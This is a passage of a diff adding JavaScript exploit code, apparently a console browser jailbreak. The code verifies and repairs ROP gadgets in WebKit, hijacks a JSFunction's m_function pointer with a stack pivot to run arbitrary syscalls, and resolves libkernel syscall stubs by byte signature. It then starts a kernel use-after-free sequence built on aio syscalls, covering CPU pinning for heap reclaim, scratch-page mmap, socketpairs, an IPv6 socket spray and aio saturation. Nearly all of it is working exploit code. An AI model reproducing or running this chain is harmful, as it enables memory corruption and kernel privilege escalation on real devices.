+            + (w2 ? "-window2=[" + hex(w2.lo) + ".." + hex(w2.hi) + "]" : "")
+            + "-pattern=48-c7-c0-14-00-00-00-49-not-found"
+            + "-action=clean-stop-no-further-reads");
+        return 0;
+    }
+    return r4StubFound(w1, addr, w2 ? 2 : 1, "pattern");
+}
+
+function r4GadgetWindow(rva, half) {
+    var lo = rva - half;
+    if (lo < R4_GAD_MIN_RVA) lo = R4_GAD_MIN_RVA;
+    return { lo: lo, hi: rva + half };
+}
+
+function r4RexEquiv(expected, actual) {
+    if (actual === expected) return true;
+    if ((expected & 0xf8) !== 0x40) return false;
+    return (actual & 0xf8) === 0x40
+        && (actual & 0x08) === (expected & 0x08);
+}
+function r4ScanGadgetPattern(base, lo, hi, pat) {
+    var rexHead = (pat[0] & 0xf8) === 0x40;
+    for (var a = lo; a <= hi; ++a) {
+        var b0 = ext_read8(base + a);
+        if (rexHead ? !r4RexEquiv(pat[0], b0) : (b0 !== pat[0])) continue;
+        var okp = true;
+        for (var k = 1; k < pat.length; ++k) {
+            if (ext_read8(base + a + k) !== pat[k]) { okp = false; break; }
+        }
+        if (okp) return a;
+    }
+    return 0;
+}
+
+function r4GadgetMotifHex(pat) {
+    var s = "";
+    for (var q = 0; q < pat.length; ++q) s += r4Hex2(pat[q]);
+    return s;
+}
+
+function r4RepairGadget(base, ent) {
+    var pat = ent[2];
+    var w1 = r4GadgetWindow(ent[1], R4_GAD_WIN1);
+    r3Log("FCALL-GADGET-REPAIR-SCAN", "name=" + ent[0]
+        + "-rvaOld=0x" + ent[1].toString(16)
+        + "-window1=[" + hex(base + w1.lo) + ".." + hex(base + w1.hi) + "]"
+        + "-pattern=" + r4GadgetMotifHex(pat)
+        + "-(module-text-of-a-pair-verified-base)");
+    var rvaNew = r4ScanGadgetPattern(base, w1.lo, w1.hi, pat);
+    var usedWin = 1;
+    if (!rvaNew) {
+        var w2 = r4GadgetWindow(ent[1], R4_GAD_WIN2);
+        r3Log("FCALL-GADGET-REPAIR-WIDEN", "name=" + ent[0]
+            + "-window2=[" + hex(base + w2.lo) + ".." + hex(base + w2.hi) + "]"
+            + "-(single-widening-+-0x" + R4_GAD_WIN2.toString(16)
+            + "-floor-clamped-at->=+0x" + R4_GAD_MIN_RVA.toString(16) + ")");
+        rvaNew = r4ScanGadgetPattern(base, w2.lo, w2.hi, pat);
+        usedWin = 2;
+    }
+    if (!rvaNew) {
+        r3Log("FCALL-GADGET-REPAIR-FAIL", "name=" + ent[0]
+            + "-rvaOld=0x" + ent[1].toString(16)
+            + "-pattern=" + r4GadgetMotifHex(pat)
+            + "-not-found-windows-1-2"
+            + "-action=gadget-rejected");
+        return 0;
+    }
+    var s = "";
+    for (var j = 0; j < R4_GADGET_DUMP; ++j)
+        s += r4Hex2(ext_read8(base + rvaNew + j));
+    r4SendDump("gadgfix-" + ent[0], 0, s);
+    var delta = rvaNew - ent[1];
+    r3Log("FCALL-GADGET-REPAIRED", "name=" + ent[0]
+        + "-rvaOld=0x" + ent[1].toString(16)
+        + "-rvaNew=0x" + rvaNew.toString(16)
+        + "-delta=" + (delta >= 0 ? "+0x" : "-0x") + Math.abs(delta).toString(16)
+        + "-window=" + usedWin
+        + "-pattern=" + r4GadgetMotifHex(pat));
+    return rvaNew;
+}
+
+function r4GadgetGate(base) {
+    var G = {};
+    var bad = [];
+    var repaired = [];
+    for (var i = 0; i < R4_GAD.length; ++i) {
+        var ent = R4_GAD[i];
+        var a = base + ent[1];
+        var bytes = new Array(R4_GADGET_DUMP);
+        var s = "";
+        for (var j = 0; j < R4_GADGET_DUMP; ++j) {
+            bytes[j] = ext_read8(a + j);
+            s += r4Hex2(bytes[j]);
+        }
+        r4SendDump("gadg-" + ent[0], 0, s);
+        var okj = true;
+        for (var k = 0; k < ent[2].length; ++k) {
+            var eq = bytes[k] === ent[2][k]
+                  || (k === 0 && r4RexEquiv(ent[2][k], bytes[k]));
+            if (!eq) {
+                okj = false;
+                r3Log("FCALL-GADGET-BAD", ent[0] + "-rva=0x" + ent[1].toString(16)
+                    + "-octet=" + k
+                    + "-expected=0x" + ent[2][k].toString(16)
+                    + "-lu=0x" + bytes[k].toString(16));
+                break;
+            }
+        }
+        if (okj) {
+            G[ent[0]] = a;
+            continue;
+        }
+        var rvaNew = r4RepairGadget(base, ent);
+        if (rvaNew) {
+            G[ent[0]] = base + rvaNew;
+            repaired.push(ent[0]);
+        } else {
+            bad.push(ent[0]);
+        }
+    }
+    r3Log("FCALL-GADGET-GATE", (bad.length === 0 ? "PASS" : "FAIL")
+        + "-" + (R4_GAD.length - bad.length) + "/" + R4_GAD.length
+        + "-repaired=" + repaired.length
+        + (repaired.length > 0 ? "-names=" + repaired.join("+") : "")
+        + "-rva-family=13.00=13.50=13.52-(frozen)-bytes=dumps-pour-audit");
+    return bad.length === 0 ? G : null;
+}
+
+function r4Put64(dv, at, val) {
+    var hi = Math.floor(val / 0x100000000);
+    var lo = val - hi * 0x100000000;
+    dv.setUint32(at, lo >>> 0, true);
+    dv.setUint32(at + 4, hi >>> 0, true);
+}
+
+function r4Put64LoHi(dv, at, lo, hi) {
+    dv.setUint32(at, lo >>> 0, true);
+    dv.setUint32(at + 4, hi >>> 0, true);
+}
+
+var R4_ARG_GADGETS = ["POP_RDI_RET", "POP_RSI_RET", "POP_RDX_RET",
+    "POP_RCX_RET", "POP_R8_RET", "POP_R9_RET"];
+
+function r4MakeCtx(G) {
+    var sb = new ArrayBuffer(0x20);
+    var pb = new ArrayBuffer(R4_PB_SIZE);
+    var kb = new ArrayBuffer(0x2000);
+    var fb = new ArrayBuffer(0x40);
+    var c = {
+        storeDv: new DataView(sb),
+        pivotDv: new DataView(pb),
+        stackDv: new DataView(kb),
+        frameDv: new DataView(fb),
+        stackU8: new Uint8Array(kb),
+        frameU8: new Uint8Array(fb)
+    };
+    R4_KEEP.push(sb, pb, kb, fb, c.storeDv, c.pivotDv, c.stackDv,
+        c.frameDv, c.stackU8, c.frameU8);
+    c.S = r4BufAddr(sb);
+    c.P = r4BufAddr(pb);
+    c.K = r4BufAddr(kb);
+    c.F = r4BufAddr(fb);
+    r4Put64(c.storeDv, 0x00, G.G1);
+    r4Put64(c.storeDv, 0x08, c.P);
+    r4Put64(c.storeDv, 0x10, G.G3);
+    r4Put64(c.storeDv, 0x18, G.G2);
+    r4Put64(c.pivotDv, 0x00, c.P);
+    r4Put64(c.pivotDv, 0x10, G.G5);
+    r4Put64(c.pivotDv, 0x20, G.G4);
+    return c;
+}
+
+function r4Layout(G, c, target, args) {
+    c.stackU8.fill(0);
+    c.frameU8.fill(0);
+    var insts = [];
+    for (var i = 0; i < args.length; ++i) {
+        insts.push(G[R4_ARG_GADGETS[i]]);
+        insts.push(args[i]);
+    }
+    var targetIdx = insts.length;
+    insts.push(target);
+    insts.push(G.POP_RDI_RET);
+    insts.push(c.F);
+    insts.push(G.MOV_RDI_RAX_RET);
+    insts.push(G.POP_RAX_RET);
+    insts.push(0);
+    insts.push(G.LEAVE_RET);
+    var undefIdx = insts.length - 2;
+    var at = 0x2000 - 8 * insts.length;
+    if (((c.K + at + 8 * targetIdx) % 0x10) !== 0) at -= 8;
+    for (var m = 0; m < insts.length; ++m) {
+        if (m === undefIdx)
+            r4Put64LoHi(c.stackDv, at + 8 * m, R4_UNDEF_LO, R4_UNDEF_HI);
+        else
+            r4Put64(c.stackDv, at + 8 * m, insts[m]);
+    }
+    r4Put64(c.pivotDv, R4_PIVOT_VIEW_SP, c.K + at);
+    return at;
+}
+
+function r4Main(base, exeE) {
+    r3Log("FCALL-BOOT", "rev=" + R4_REVISION
+        + "-source=jb.js:448-538-relapse_1352"
+        + "-validation=getpid-syscall-20-(their-first-call-jb.js:533)"
+        + "-no-other-syscall-no-kernel-probe"
+        + "-gadgets=" + R4_GAD.length + "-rva-famille=13.00-gel"
+        + "-gadget-reparation=pattern-0x8000-0x20000-min-0x4000"
+        + "-stub-exact=+0x6cf0-(libkernel window dump)"
+        + "-pivot_sp=0x" + R4_PIVOT_VIEW_SP.toString(16));
+
+    if (!r4BufAddrSelfTest())
+        return "FCALL-BUFADDR-FAIL";
+
+    var errorFn = ext_read64(base + R3_WK_IMP_ERROR);
+    r3Log("FCALL-IMP-DEREF", "errorFn=" + hex(errorFn)
+        + "-at=webkit+0x" + R3_WK_IMP_ERROR.toString(16)
+        + "-(jb.js:325-p.read8(webkitBase.add32(wk___imp___error)))");
+    if (!plausibleCell(errorFn)) {
+        r3Log("FCALL-STUB-FAIL", "reason=errorFn-implausible"
+            + "-errorFn=" + hex(errorFn)
+            + "-action=clean-stop-no-window-read");
+        return "FCALL-STUB-FAIL";
+    }
+
+    var G = r4GadgetGate(base);
+    if (!G) return "FCALL-GADGET-FAIL";
+
+    var stubAddr = r4FindStub(errorFn);
+    if (!stubAddr) return "FCALL-STUB-FAIL";
+    r4DumpRange("stub-getpid", stubAddr, 0x20);
+    r3Log("FCALL-SYSCOUNT", "hint=302"
+        + "-(offline-measure-libkernel-window-48-c7-c0-num32-49-89-ca-0f-05"
+        + "-from-0x52b0-including-623-and-550)"
+        + "-INFO-no-runtime-reads");
+
+    var c = r4MakeCtx(G);
+    var mainMf = exeE.exe + R3_WK_JSFUNCTION_M_FUNCTION;
+    var mainOrig = ext_read64(mainMf);
+    if (mainOrig !== exeE.s28) {
+        r3Log("FCALL-MAINMF-FAIL", "mf=" + hex(mainMf)
+            + "-relit=" + hex(mainOrig)
+            + "-s28leak=" + hex(exeE.s28)
+            + "-action=refuse-reread-diverges");
+        return "FCALL-MAINMF-FAIL";
+    }
+    var pivotObj = {};
+    R4_KEEP.push(pivotObj);
+    var pivotCell = ext_addrof(pivotObj);
+    if (!plausibleCell(pivotCell)) return "FCALL-PIVOT-ADDROF-FAIL";
+    r3Log("FCALL-CTX", "S=" + hex(c.S) + "-P=" + hex(c.P)
+        + "-K=" + hex(c.K) + "-F=" + hex(c.F)
+        + "-mf=" + hex(mainMf) + "-orig=" + hex(mainOrig)
+        + "-pivotCell=" + hex(pivotCell)
+        + "-store=[G1,P,G3,G2]-pivot=[P,.,G5,.,G4,.,.,K+at]");
+
+    var at = r4Layout(G, c, stubAddr, []);
+    r4DumpRange("fcall-store", c.S, 0x40);
+    r4DumpRange("fcall-pivot", c.P, 0x40);
+    r4DumpRange("fcall-stack", c.K + at, 0x40);
+    r4DumpRange("fcall-frame", c.F, 0x40);
+    r3Flush();
+
+    // THE LAW: ONE arm->disarm cycle per session; getpid is already
+    // proven - go straight to the aio layer (the only consumer of the
+    // series on this page).
+    r3Log("FCALL-SKIPPED",
+        "getpid-already-proven-one-cycle-per-session-law"
+        + "-direct-to-aio-layer");
+    r12AioLayer(errorFn, G, c, mainMf, mainOrig, pivotObj, pivotCell);
+    return "FCALL-SETUP-OK";
+}
+
+function r4FcallLayer(base, exeE) {
+    r3Flush();
+    var verdict = "FCALL-INCOMPLETE";
+    try {
+        if (!plausibleCell(base) || !exeE || !plausibleCell(exeE.exe)) {
+            r3Log("FCALL-SKIPPED", "reason=base-ou-exe-invalide");
+            verdict = "FCALL-SKIPPED";
+        } else {
+            r3BigFree();
+            verdict = r4Main(base, exeE);
+        }
+    } catch (error) {
+        r3Log("FCALL-THREW", (error && error.name) + ":"
+            + String(error && error.message).slice(0, 100));
+        try {
+            r3Log("FCALL-EXPM1-POST-THREW", "expm1(1)=" + Math.expm1(1)
+                + "-(finally-restored-before-propagation)");
+        } catch (_) {}
+        verdict = "FCALL-FAIL";
+    }
+    r3Log("FCALL-DONE", "verdict=" + verdict
+        + "-dumps=" + r4DumpChunksTotal + "chunks/" + r4DumpBytesTotal
+        + "bytes-(relative-async-mechanism)");
+    r3Flush();
+}
+
+// =====================================================================
+// AIO LAYER - the scene's aio kernel-exploit sequence, the only
+// consumer of the armed series on this page (laws in the header).
+// =====================================================================
+var R12_REVISION = "aio-scene-1";
+
+// syscalls (nums = table SYS jb.js:103-127)
+var R12_NUM_CLOSE = 6;              // jb.js SYS.close (the 114 at +0x5890 is NOT the scene's close - never called)
+var R12_NUM_SOCKET = 97;            // pool spray AF_INET6 DGRAM
+var R12_NUM_SETSOCKOPT = 0x69;      // 105 - P1 (free) and P4 (spray)
+var R12_NUM_GETSOCKOPT = 118;       // whoHasF (?wholen=)
+var R12_NUM_SOCKETPAIR = 0x87;      // 135 - P2 cmds + blocking group
+var R12_NUM_MMAP = 477;             // scratch page 0x04000000 (hard gate)
+var R12_NUM_AIO_DELETE = 662;       // end-of-round reap
+var R12_NUM_AIO_WAIT = 663;         // P3
+var R12_NUM_AIO_POLL = 664;         // end-of-round reap
+var R12_NUM_AIO_CANCEL = 666;       // P5 = THE WALK
+var R12_NUM_AIO_SUBMIT = 669;       // P2
+var R12_NUM_CPUSET_GET = 487;       // pin: read the core mask
+var R12_NUM_CPUSET_SET = 488;       // pin: pin the thread (UMA bucket)
+
+// EXACT offsets measured from the libkernel window dump
+var R12_OFF_CLOSE = 0x77a0;
+var R12_OFF_SOCKET = 0x71d0;
+var R12_OFF_SETSOCKOPT = 0x5610;
+var R12_OFF_GETSOCKOPT = 0x5470;
+var R12_OFF_SOCKETPAIR = 0x6400;
+var R12_OFF_MMAP = 0x72b0;
+var R12_OFF_AIO_DELETE = 0x6e30;
+var R12_OFF_AIO_WAIT = 0x6560;
+var R12_OFF_AIO_POLL = 0x78c0;
+var R12_OFF_AIO_CANCEL = 0x76c0;
+var R12_OFF_AIO_SUBMIT = 0x5f70;
+var R12_OFF_CPUSET_GET = 0x5c00;    // verified from the dump, 2026-10-16 (unique window)
+var R12_OFF_CPUSET_SET = 0x5e90;    // same
+
+// scene constants (jb.js:588-609, 759, 938-943, 955, 979-986)
+var R12_IPPROTO_IPV6 = 41, R12_IPV6_RTHDR = 51;
+var R12_AF_INET6 = 28, R12_SOCK_DGRAM = 2;
+var R12_AF_UNIX = 1, R12_SOCK_STREAM = 1;
+var R12_RTH_SIZE = 0x48, R12_RTH_LEN = 8;
+var R12_NODE_SZ = 0x38;
+// segleft/page/dec are RUNTIME values (chosen by the scratch gate
+// according to which mmap hint succeeds). The decrement address =
+// segleft<<24 | len<<8 (len=8 @+1, segleft @+3 - rthdr encoding, bytes
+// +0/+2 are zero)
+var R12_SEGLEFT_CUR = 4;                // updated by the scratch gate
+var R12_SCRATCH_PAGE_CUR = 0x04000000;  // same
+var R12_NODE0_DEC = 0x04000800;         // same - NEVER read an unmapped page
+var R12_PROT_RW = 3;
+var R12_MAP_FIXED = 0x10, R12_MAP_ANON = 0x1000, R12_MAP_PRIVATE = 2;
+var R12_DESC_SZ = 0x28;                 // aio descriptor: +0x08 len, +0x10 buf, +0x20 fd
+var R12_NBLOCK = 8;                     // saturation (jb.js:910-921)
+var R12_STUB_DRIFT_WIN = 0x100;         // inter-boot drift fallback
+var R12_SCAN_LO = 0x52b0;               // table zone measured in the dump
+var R12_SCAN_HI = 0x7980;               // covers stub 664 (+0x78c0 + tail)
+var R12_STUB_DUMP = 0x20;
+
+// parameters (?arms=1&spray=96&towait=1000&wholen=0&noclose=1) - ONE
+// P1->P5 sequence per session by default (the law)
+var R12_ARMS = Math.max(1, Math.min(8,
+    parseInt(Q.get("arms") || "1", 10) || 1));
+var R12_SPRAY = Math.max(16, Math.min(512,
+    parseInt(Q.get("spray") || "96", 10) || 96));
+var R12_TOWAIT = Math.max(1, Math.min(100000,
+    parseInt(Q.get("towait") || "1000", 10) || 1000));
+var R12_WHOLEN = Math.max(0, Math.min(512,
+    parseInt(Q.get("wholen") || "0", 10) || 0));
+
+var R12_KEEP = [];
+function R12_RV0(r) {
+    return r.hi === 0 && (r.lo >>> 0) === 0;
+}
+function R12_RET(r) {
+    return "0x" + (r.lo >>> 0).toString(16)
+        + (r.hi === 0 ? "" : ":0x" + (r.hi >>> 0).toString(16));
+}
+
+// stub resolution: exact offset -> +-0x100 drift -> net scan (the
+// dump's table zone, inside the fcall guard)
+function r12StubNumSig(num) {
+    return [0x48, 0xc7, 0xc0, num & 0xff, (num >>> 8) & 0xff,
+        (num >>> 16) & 0xff, (num >>> 24) & 0xff,
+        0x49, 0x89, 0xca, 0x0f, 0x05];
+}
+
+// BYTE-BY-BYTE verification through the carrier
+function r12IsStubNum(addr, num) {
+    var sig = r12StubNumSig(num);
+    for (var i = 0; i < sig.length; ++i)
+        if (ext_read8(addr + i) !== sig[i]) return false;
+    return true;
+}
+
+function r12ResolveStub(errorFn, num, off, name) {
+    var exact = errorFn + off;
+    if (r12IsStubNum(exact, num)) {
+        r3Log("AIO-STUB-EXACT", "name=" + name + "-num=" + num
+            + "-addr=" + hex(exact)
+            + "-off=+0x" + off.toString(16)
+            + "-unique-window-in-the-libkernel-dump");
+        return exact;
+    }
+    var lo = exact - R12_STUB_DRIFT_WIN;
+    var hi = exact + R12_STUB_DRIFT_WIN;
+    r3Log("AIO-STUB-EXACT-FAIL", "name=" + name + "-num=" + num
+        + "-off=+0x" + off.toString(16)
+        + "-fallback=+-0x" + R12_STUB_DRIFT_WIN.toString(16));
+    for (var a = lo; a <= hi; ++a) {
+        if (r12IsStubNum(a, num)) {
+            r3Log("AIO-STUB-DRIFT", "name=" + name + "-addr=" + hex(a)
+                + "-delta-vs-exact=" + (a >= exact ? "+0x" : "-0x")
+                + Math.abs(a - exact).toString(16));
+            return a;
+        }
+    }
+    r3Log("AIO-STUB-SCAN", "name=" + name
+        + "-window=[" + hex(errorFn + R12_SCAN_LO) + ".."
+        + hex(errorFn + R12_SCAN_HI) + "]-(table-zone-of-the-libkernel-dump)");
+    for (var f = errorFn + R12_SCAN_LO; f <= errorFn + R12_SCAN_HI; ++f) {
+        if (r12IsStubNum(f, num)) {
+            r3Log("AIO-STUB-SCAN-FOUND", "name=" + name + "-addr=" + hex(f)
+                + "-delta-vs-exact=" + (f >= exact ? "+0x" : "-0x")
+                + Math.abs(f - exact).toString(16));
+            return f;
+        }
+    }
+    r3Log("AIO-STUB-FAIL", "name=" + name + "-num=" + num
+        + "-errorFn=" + hex(errorFn)
+        + "-exact=+0x" + off.toString(16)
+        + "-action=clean-stop-zero-syscalls");
+    return 0;
+}
+
+// THE SERIES: the scene's exact loop (jb.js:506-533) - m_function is
+// armed ONCE per series, the pivot is saved/pointed/triggered/restored
+// PER CALL, and the finally restores. ONE series per session (the law).
+function r12Series(G, c, mainMf, mainOrig, pivotObj, pivotCell, label,
+    stubs, body) {
+    var pivotOrig = ext_read64(pivotCell);
+    ext_write64(mainMf, G.G0);               // jb.js:512 : une fois par serie
+    if (ext_read64(mainMf) !== G.G0)
+        throw new Error("r12-mf-arm-failed-(relecture-rpc_worker.js:134-137)");
+    r3Log("AIO-SERIES-ARMED", "series=" + label
+        + "-mf=" + hex(mainMf)
+        + "-pivotOrig=" + hex(pivotOrig)
+        + "-(jb.js:512-arme-une-fois-boucle-sans-restaurer-jb.js:526-533)");
+    var calls = 0;
+    function sc(num, args) {                 // jb.js:526 : sc(num, ...a)
+        var stubAddr = stubs[num];
+        if (!stubAddr || !r12IsStubNum(stubAddr, num))
+            throw new Error("r12-stub-verif-" + num + "-addr="
+                    + hex(stubAddr || 0));       // never call an unverified address
+        r4Layout(G, c, stubAddr, args);      // jb.js:515
+        var saved = ext_read64(pivotCell);   // jb.js:516
+        ext_write64(pivotCell, c.S);         // jb.js:517
+        var retjs;
+        try {
+            retjs = Math.expm1(pivotObj);    // jb.js:518 : LE DECLENCHEUR
+        } finally {
+            ext_write64(pivotCell, saved);   // jb.js:519 (defense par appel)
+        }
+        calls++;
+        return { lo: c.frameDv.getUint32(0, true) >>> 0,
+                 hi: c.frameDv.getUint32(4, true) >>> 0,
+                 retjs: retjs };
+    }
+    try {
+        return body(sc);
+    } finally {
+        ext_write64(mainMf, mainOrig);       // jb.js:3342-3350
+        var mfNow = ext_read64(mainMf);
+        var pcNow = ext_read64(pivotCell);
+        r3Log("AIO-SERIES-DISARMED", "series=" + label
+            + "-calls=" + calls
+            + "-mf=" + (mfNow === mainOrig ? "RESTORED" : "ALERT=" + hex(mfNow))
+            + "-pivot=" + (pcNow === pivotOrig ? "RESTORED" : "ALERT=" + hex(pcNow))
+            + "-(full-restore-after-the-series)");
+    }
+}
+
+// LA SEQUENCE AIO P1->P5 - une seule thread : les preuves par les sinks
+// ne demandent AUCUNE concurrence (compteurs dans NOS ArrayBuffers, lus
+// APRES le retour du syscall).
+function r12ProbeAio(G, c, mainMf, mainOrig, pivotObj, pivotCell, stubs) {
+    var syscalls = 0;
+    var st = { phase: "init", submitOk: 0, rounds: 0, walkProofs: 0,
+               whoHits: 0, scratch0: null };
+
+    r12Series(G, c, mainMf, mainOrig, pivotObj, pivotCell,
+        "kex-aio", stubs, function (sc) {
+
+        // 0. THE PIN (jb.js:784-894) - THE key to the reclaim. Scene
+        // comment jb.js:861: "(free and malloc in armOnce now share one
+        // UMA per-cpu bucket)". Sony/FreeBSD malloc serves each core
+        // from its OWN UMA bucket: a chunk freed on core X (the job
+        // deaths, processed on the submitter's core) is only handed to
+        // mallocs on that same core. Unpinned, the JS thread migrates:
+        // the P4 spray draws from another bucket = SYSTEMATIC reclaim
+        // miss (measured 2026-10-16: 3 rounds, 0/4 hits at 96 then 192
+        // sockets, identical signature).
+        var pinAb = new ArrayBuffer(0x10), pinDv = new DataView(pinAb);
+        R12_KEEP.push(pinAb, pinDv);
+        var pinAd = r4BufAddr(pinAb);
+        var rvG = sc(R12_NUM_CPUSET_GET, [3, 1, -1, 0x10, pinAd]);
+        syscalls++;
+        var savedMask = pinDv.getUint32(0, true) >>> 0;
+        var cores = [];
+        for (var ci = 0; ci < 32; ++ci)
+            if (savedMask & (1 << ci)) cores.push(ci);
+        r3Log("AIO-PIN-AVAIL", "rv=" + R12_RET(rvG)
+            + "-mask=0x" + savedMask.toString(16)
+            + "-cores=" + cores.join(",")
+            + "-(jb.js:784-809)");
+        var pinCore = cores.length ? cores[0] : 0;
+        new Uint8Array(pinAb).fill(0);
+        pinDv.setUint32(0, (1 << pinCore) >>> 0, true);
+        var rvS = sc(R12_NUM_CPUSET_SET, [3, 1, -1, 0x10, pinAd]);
+        syscalls++;
+        new Uint8Array(pinAb).fill(0);
+        var rvV = sc(R12_NUM_CPUSET_GET, [3, 1, -1, 0x10, pinAd]);
+        syscalls++;
+        var backMask = pinDv.getUint32(0, true) >>> 0;
+        var pinOk = R12_RV0(rvS) && R12_RV0(rvV)
+            && backMask === ((1 << pinCore) >>> 0);
+        r3Log("AIO-PIN-SET", "core=" + pinCore
+            + "-set=" + R12_RET(rvS)
+            + "-back=0x" + backMask.toString(16)
+            + (pinOk ? "-PASS-(free-and-malloc-share-one-UMA-bucket)"
+                     : "-FAIL-(continuing-unpinned-the-reclaim-stays-random)"));
+        r3Flush();
+        try {
+
+        // 1. THE SCRATCH PAGE (hard gate): node0+0x00 = segleft<<24|0x800
+        // encoded in the rthdr bytes - the page MUST be mapped before
+        // any cancel. MAP_FIXED is refused, and speculatively reading
+        // 0x04000800 = SIGSEGV (a try/catch does not catch a page
+        // fault). THE APPROACH: an explicit mmap HINT without
+        // MAP_FIXED. FreeBSD (kern_mmap -> vm_map_findspace) starts
+        // the search AT the hint: if [hint, hint+0x10000) is free,
+        // mmap returns the hint EXACTLY. segleft ladder 4->3->2->1
+        // (each value is a valid target address for the rthdr
+        // encoding, len=8). Verified by the RETURN VALUE only - NO
+        // read of the target address until mmap has confirmed the page.
+        {
+            st.phase = "mmap";
+            var r13Ladder = [4, 3, 2, 1];
+            var r13Hit = 0;                  // segleft gagnant
+            for (var li = 0; li < r13Ladder.length && !r13Hit; ++li) {
+                var sl = r13Ladder[li];
+                var hint = sl * 0x1000000;   // segleft<<24
+                r3Flush();
+                r3Log("AIO-SCRATCH-HINT", "segleft=" + sl
+                    + "-hint=0x" + hint.toString(16)
+                    + "-len=0x10000-prot=RW-flags=ANON|PRIVATE=0x1002"
+                    + "-NO-MAP_FIXED-(hint-honored-if-range-free)");
+                var rm = sc(R12_NUM_MMAP, [hint, 0x10000,
+                    R12_PROT_RW, R12_MAP_ANON | R12_MAP_PRIVATE,
+                    0xffffffff, 0]);
+                syscalls++;
+                var mlo = (rm.lo >>> 0) + (rm.hi >>> 0) * 0x100000000;
+                var r13Err = (rm.hi >>> 0) === 0xffffffff
+                    || mlo < 0x1000;          // -1 etendu ou errno nu
+                r3Flush();
+                r3Log("AIO-SCRATCH-HINT-RET", "segleft=" + sl
+                    + "-ret=0x" + (rm.lo >>> 0).toString(16)
+                    + ":0x" + (rm.hi >>> 0).toString(16)
+                    + (mlo === hint ? "-HINT-EXACT=PAGE-SECURED"
+                        : (r13Err ? "-REFUSED" : "-DYNAMIC=hint-ignored")));
+                if (mlo === hint)
+                    r13Hit = sl;
+            }
+            if (!r13Hit) {
+                // last resort before giving up: MAP_FIXED on the
+                // original hint (0x04000000) - already refused before;
+                // re-confirm for the log, it cannot crash
+                r3Flush();
+                r3Log("AIO-SCRATCH-FIXED-RECONFIRM", "hint=0x04000000"
+                    + "-flags=FIXED|ANON|PRIVATE=0x1012");
+                var rmf = sc(R12_NUM_MMAP, [0x04000000, 0x10000,
+                    R12_PROT_RW, R12_MAP_FIXED | R12_MAP_ANON
+                    | R12_MAP_PRIVATE, 0xffffffff, 0]);
+                syscalls++;
+                r3Flush();
+                r3Log("AIO-SCRATCH-FIXED-RET", "ret=0x"
+                    + (rmf.lo >>> 0).toString(16)
+                    + ":0x" + (rmf.hi >>> 0).toString(16));
+                if ((rmf.lo >>> 0) === 0x04000000 && (rmf.hi >>> 0) === 0)
+                    r13Hit = 4;
+            }
+            if (!r13Hit) {
+                r3Flush();
+                r3Log("AIO-SCRATCH-REFUSE", "ladder=4-3-2-1-hint"
+                    + "-and-FIXED-all-failed-zero-target-reads"
+                    + "-law=no-cancel-without-a-page");
+                return "scratch-refuse";
+            }
+            R12_SEGLEFT_CUR = r13Hit;
+            R12_SCRATCH_PAGE_CUR = r13Hit * 0x1000000;
+            R12_NODE0_DEC = R12_SCRATCH_PAGE_CUR + 0x800;
+            st.scratch0 = ext_read32(R12_NODE0_DEC) >>> 0;  // page CONFIRMEE
+            r3Flush();
+            r3Log("AIO-SCRATCH-OK", "segleft=" + R12_SEGLEFT_CUR
+                + "-page=0x" + R12_SCRATCH_PAGE_CUR.toString(16)
+                + "-dec=0x" + R12_NODE0_DEC.toString(16)
+                + "-val0=0x" + st.scratch0.toString(16)
+                + "-(page-confirmed-by-mmap-return-reread-by-the-carrier)");
+        }
+
+        // 2. socketpairs (jb.js:923-932 cmds, 759-769 blocking)
+        var spAb = new ArrayBuffer(8);
+        var spDv = new DataView(spAb);
+        R12_KEEP.push(spAb, spDv);
+        var spAddr = r4BufAddr(spAb);
+        r3Flush();
+        r3Log("AIO-SP-PRE", "AF_UNIX-SOCK_STREAM-(jb.js:926)");
+        st.phase = "socketpair";
+        var rsp = sc(R12_NUM_SOCKETPAIR, [R12_AF_UNIX, R12_SOCK_STREAM,
+            0, spAddr]);
+        syscalls++;
+        r3Log("AIO-SP-RET", "ret=" + R12_RET(rsp)
+            + "-sp0=" + spDv.getInt32(0, true)
+            + "-sp1=" + spDv.getInt32(4, true));
+        if (!R12_RV0(rsp)) return "socketpair-refuse";
+        var sp0 = spDv.getInt32(0, true);
+
+        var bspAb = new ArrayBuffer(8);
+        var bspDv = new DataView(bspAb);
+        R12_KEEP.push(bspAb, bspDv);
+        var bspAddr = r4BufAddr(bspAb);
+        r3Flush();
+        r3Log("AIO-BSP-PRE", "blocking-socketpair-(jb.js:763)");
+        st.phase = "socketpair-bloc";
+        var rbsp = sc(R12_NUM_SOCKETPAIR, [R12_AF_UNIX, R12_SOCK_STREAM,
+            0, bspAddr]);
+        syscalls++;
+        r3Log("AIO-BSP-RET", "ret=" + R12_RET(rbsp)
+            + "-bsp0=" + bspDv.getInt32(0, true));
+        if (!R12_RV0(rbsp)) return "socketpair-bloc-refuse";
+        var bsp0 = bspDv.getInt32(0, true);
+
+        // 3. THE POOL (jb.js:967-974): the spray's AF_INET6 DGRAM sockets
+        var POOL = [];
+        for (var i = 0; i < R12_SPRAY; ++i) {
+            var rs = sc(R12_NUM_SOCKET, [R12_AF_INET6, R12_SOCK_DGRAM, 0]);
+            syscalls++;
+            if (!(rs.hi === 0 && (rs.lo >>> 0) < 0x10000)) break;
+            POOL.push(rs.lo >>> 0);
+        }
+        r3Log("AIO-POOL", "requested=" + R12_SPRAY
+            + "-obtained=" + POOL.length
+            + "-(rthdr-reclaim-sockets-jb.js:968-973)");
+        if (POOL.length < 16) return "pool-empty";
+
+        // 4. saturation (jb.js:910-921): 8 cmds on the never-read
+        // blocking socketpair - an immortal group, the daemon stays busy
+        var brbAb = new ArrayBuffer(0x40);
+        var brqAb = new ArrayBuffer(R12_NBLOCK * R12_DESC_SZ);
+        var brqDv = new DataView(brqAb);
+        var bidAb = new ArrayBuffer(R12_NBLOCK * 4);
+        R12_KEEP.push(brbAb, brqAb, brqDv, bidAb);
+        var brqAddr = r4BufAddr(brqAb), bidAddr = r4BufAddr(bidAb);
+        var brbAddr = r4BufAddr(brbAb);
+        for (var k = 0; k < R12_NBLOCK; ++k) {
+            var b = k * R12_DESC_SZ;
+            r4Put64(brqDv, b + 0x08, 0x40);          // length
+            r4Put64(brqDv, b + 0x10, brbAddr);       // buffer
+            brqDv.setInt32(b + 0x20, bsp0, true);    // fd
+        }
+        r3Flush();
+        r3Log("AIO-SATURATE-PRE", "8-cmds-0x40-sur-bsp0-(jb.js:910-921)");
+        st.phase = "saturate";
+        var rsat = sc(R12_NUM_AIO_SUBMIT, [0x1001, brqAddr,
+            R12_NBLOCK, 3, bidAddr]);
+        syscalls++;
+        var bidVal = (new DataView(bidAb)).getUint32(0, true) >>> 0;
